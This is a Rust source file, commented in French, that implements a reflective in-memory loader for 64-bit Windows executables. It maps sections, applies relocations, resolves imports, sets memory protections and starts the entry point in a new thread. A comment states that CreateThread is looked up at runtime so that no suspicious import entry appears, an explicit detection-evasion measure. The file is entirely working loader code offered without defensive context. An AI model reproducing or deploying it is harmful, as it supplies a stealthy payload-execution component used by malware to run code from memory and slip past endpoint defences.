// Reflective in-memory PE loader (PE64 uniquement).
// Flux : allouer RW → copier → fix relocs → résoudre imports → protéger sections → CreateThread(EP)

#[cfg(windows)]
use windows_sys::Win32::{
    System::{
        LibraryLoader::{GetProcAddress, GetModuleHandleA, LoadLibraryA},
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE,
                 VirtualAlloc, VirtualProtect},
    },
};

#[cfg(windows)]
type FnCreateThread = unsafe extern "system" fn(
    *mut std::ffi::c_void, usize,
    Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>,
    *mut std::ffi::c_void, u32, *mut u32,
) -> isize;

// Structures PE minimales (suffisantes pour PE64)
#[repr(C, packed)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct FileHeader {
    machine: u16,
    number_of_sections: u16,
    _time: u32,
    _sym_ptr: u32,
    _sym_cnt: u32,
    opt_hdr_size: u16,
    characteristics: u16,
}

#[repr(C)]
struct DataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct OptionalHeader64 {
    magic: u16,
    _maj_lin: u8,
    _min_lin: u8,
    _code_sz: u32,
    _init_sz: u32,
    _uninit_sz: u32,
    address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    _file_align: u32,
    _os_maj: u16,
    _os_min: u16,
    _img_maj: u16,
    _img_min: u16,
    _sub_maj: u16,
    _sub_min: u16,
    _win32_ver: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _checksum: u32,
    _subsystem: u16,
    _dll_chars: u16,
    _stack_res: u64,
    _stack_com: u64,
    _heap_res: u64,
    _heap_com: u64,
    _loader_flags: u32,
    number_of_rva: u32,
    // Suivi de DataDirectory[number_of_rva]
}

#[repr(C)]
struct NtHeaders64 {
    signature: u32,
    file_header: FileHeader,
    optional_header: OptionalHeader64,
}

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _ptr_relocs: u32,
    _ptr_line: u32,
    _num_relocs: u16,
    _num_lines: u16,
    characteristics: u32,
}

// IMAGE_DIRECTORY_ENTRY indices
const DIR_IMPORT: usize = 1;
const DIR_BASERELOC: usize = 5;

// IMAGE_SCN_* flags
const SCN_CNT_CODE: u32 = 0x00000020;
const SCN_MEM_EXECUTE: u32 = 0x20000000;
const SCN_MEM_READ: u32 = 0x40000000;
const SCN_MEM_WRITE: u32 = 0x80000000;

#[cfg(windows)]
pub unsafe fn load(data: &[u8]) -> Result<(), ()> {
    // Vérifier la signature MZ
    if data.len() < std::mem::size_of::<DosHeader>() {
        return Err(());
    }
    let dos = &*(data.as_ptr() as *const DosHeader);
    if dos.e_magic != 0x5A4D {
        return Err(());
    }

    let nt_offset = dos.e_lfanew as usize;
    let nt = &*(data.as_ptr().add(nt_offset) as *const NtHeaders64);
    if nt.signature != 0x00004550 {
        return Err(());
    }
    if nt.optional_header.magic != 0x020B {
        // 0x020B = PE64
        return Err(());
    }

    let image_base = nt.optional_header.image_base as usize;
    let image_size = nt.optional_header.size_of_image as usize;

    // Allouer la mémoire pour l'image (d'abord à l'adresse préférée)
    let mut base = VirtualAlloc(
        image_base as *mut _,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as usize;

    if base == 0 {
        // Adresse préférée non disponible — allouer n'importe où
        base = VirtualAlloc(
            std::ptr::null_mut(),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as usize;
    }
    if base == 0 {
        return Err(());
    }

    let delta = (base as isize).wrapping_sub(image_base as isize);

    // Copier les headers
    std::ptr::copy_nonoverlapping(
        data.as_ptr(),
        base as *mut u8,
        nt.optional_header.size_of_headers as usize,
    );

    // Copier les sections
    let sections_ptr = (data.as_ptr() as usize
        + nt_offset
        + 4 // signature
        + std::mem::size_of::<FileHeader>()
        + nt.file_header.opt_hdr_size as usize) as *const SectionHeader;

    let n_sections = nt.file_header.number_of_sections as usize;
    for i in 0..n_sections {
        let sec = &*sections_ptr.add(i);
        if sec.size_of_raw_data == 0 {
            continue;
        }
        let dst = (base + sec.virtual_address as usize) as *mut u8;
        let src = data.as_ptr().add(sec.pointer_to_raw_data as usize);
        std::ptr::copy_nonoverlapping(src, dst, sec.size_of_raw_data as usize);
    }

    // Lire le tableau DataDirectory qui suit OptionalHeader64
    let n_rva = nt.optional_header.number_of_rva as usize;
    let dir_ptr = (data.as_ptr() as usize
        + nt_offset
        + 4
        + std::mem::size_of::<FileHeader>()
        + std::mem::size_of::<OptionalHeader64>()) as *const DataDirectory;

    // Fix relocations si l'image n'est pas à son adresse préférée
    if delta != 0 && n_rva > DIR_BASERELOC {
        let reloc_dir = &*dir_ptr.add(DIR_BASERELOC);
        if reloc_dir.size > 0 {
            fix_relocations(base, reloc_dir.virtual_address as usize, reloc_dir.size as usize, delta);
        }
    }

    // Résoudre les imports
    if n_rva > DIR_IMPORT {
        let import_dir = &*dir_ptr.add(DIR_IMPORT);
        if import_dir.size > 0 {
            if resolve_imports(base, import_dir.virtual_address as usize).is_err() {
                return Err(());
            }
        }
    }

    // Appliquer les protections mémoire par section
    for i in 0..n_sections {
        let sec = &*sections_ptr.add(i);
        let prot = section_prot(sec.characteristics);
        let mut old: u32 = 0;
        VirtualProtect(
            (base + sec.virtual_address as usize) as *mut _,
            sec.virtual_size as usize,
            prot,
            &mut old,
        );
    }

    // Résoudre CreateThread dynamiquement (pas d'entrée IAT suspecte)
    let k32_name = b"kernel32.dll\0";
    let ct_name = b"CreateThread\0";
    let k32 = GetModuleHandleA(k32_name.as_ptr());
    if k32 == 0 {
        return Err(());
    }
    let create_thread_ptr = GetProcAddress(k32, ct_name.as_ptr());
    let Some(create_thread_fn) = create_thread_ptr else {
        return Err(());
    };
    let create_thread: FnCreateThread = std::mem::transmute(create_thread_fn);

    // Lancer l'entry point dans un thread séparé
    let ep = base + nt.optional_header.address_of_entry_point as usize;
    let thread = create_thread(
        std::ptr::null_mut(),
        0,
        Some(std::mem::transmute(ep)),
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
    );
    if thread == 0 {
        return Err(());
    }

    Ok(())
}

#[cfg(windows)]
unsafe fn fix_relocations(base: usize, reloc_rva: usize, reloc_size: usize, delta: isize) {
    let mut offset = 0usize;
    while offset < reloc_size {
        let block_ptr = (base + reloc_rva + offset) as *const u32;
        let page_rva = *block_ptr as usize;
        let block_size = *block_ptr.add(1) as usize;
        if block_size < 8 {
            break;
        }
        let entries = (block_size - 8) / 2;
        let entry_ptr = (base + reloc_rva + offset + 8) as *const u16;
        for i in 0..entries {
            let entry = *entry_ptr.add(i);
            let reloc_type = (entry >> 12) as u32;
            let reloc_offset = (entry & 0x0FFF) as usize;
            if reloc_type == 10 {
                // IMAGE_REL_BASED_DIR64
                let target = (base + page_rva + reloc_offset) as *mut isize;
                *target = target.read().wrapping_add(delta);
            }
        }
        offset += block_size;
    }
}

#[cfg(windows)]
unsafe fn resolve_imports(base: usize, import_rva: usize) -> Result<(), ()> {
    // IMAGE_IMPORT_DESCRIPTOR : 20 bytes chacun, terminé par un descriptor tout à zéro
    #[repr(C)]
    struct ImportDescriptor {
        original_first_thunk: u32,
        time_date_stamp: u32,
        forwarder_chain: u32,
        name_rva: u32,
        first_thunk: u32,
    }

    let mut desc_ptr = (base + import_rva) as *const ImportDescriptor;
    loop {
        let desc = &*desc_ptr;
        if desc.name_rva == 0 {
            break;
        }

        let dll_name = std::ffi::CStr::from_ptr((base + desc.name_rva as usize) as *const i8)
            .to_bytes_with_nul()
            .to_vec();

        let h_dll = LoadLibraryA(dll_name.as_ptr() as *const u8);
        if h_dll == 0 {
            desc_ptr = desc_ptr.add(1);
            continue;
        }

        // Parcourir le thunk array
        let mut thunk_ptr = (base + desc.first_thunk as usize) as *mut usize;
        let mut orig_thunk_ptr = if desc.original_first_thunk != 0 {
            (base + desc.original_first_thunk as usize) as *const usize
        } else {
            thunk_ptr as *const usize
        };

        loop {
            let thunk_val = *orig_thunk_ptr;
            if thunk_val == 0 {
                break;
            }

            let fn_addr = if thunk_val & (1usize << 63) != 0 {
                // Import par ordinal
                let ordinal = (thunk_val & 0xFFFF) as u16;
                GetProcAddress(h_dll, ordinal as *const u8)
            } else {
                // Import par nom (thunk pointe vers IMAGE_IMPORT_BY_NAME : hint(2) + name)
                let name_ptr = (base + thunk_val + 2) as *const u8;
                GetProcAddress(h_dll, name_ptr)
            };

            if let Some(addr) = fn_addr {
                *thunk_ptr = addr as usize;
            }

            thunk_ptr = thunk_ptr.add(1);
            orig_thunk_ptr = orig_thunk_ptr.add(1);
        }

        desc_ptr = desc_ptr.add(1);
    }
    Ok(())
}

fn section_prot(chars: u32) -> u32 {
    let exec = chars & SCN_MEM_EXECUTE != 0;
    let read = chars & SCN_MEM_READ != 0;
    let write = chars & SCN_MEM_WRITE != 0;
    match (exec, read, write) {
        (true, true, true) => 0x40,  // PAGE_EXECUTE_READWRITE
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, _) => 0x10,    // PAGE_EXECUTE
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        _ => PAGE_READWRITE,
    }
}

#[cfg(not(windows))]
pub unsafe fn load(_data: &[u8]) -> Result<(), ()> {
    Err(())
}
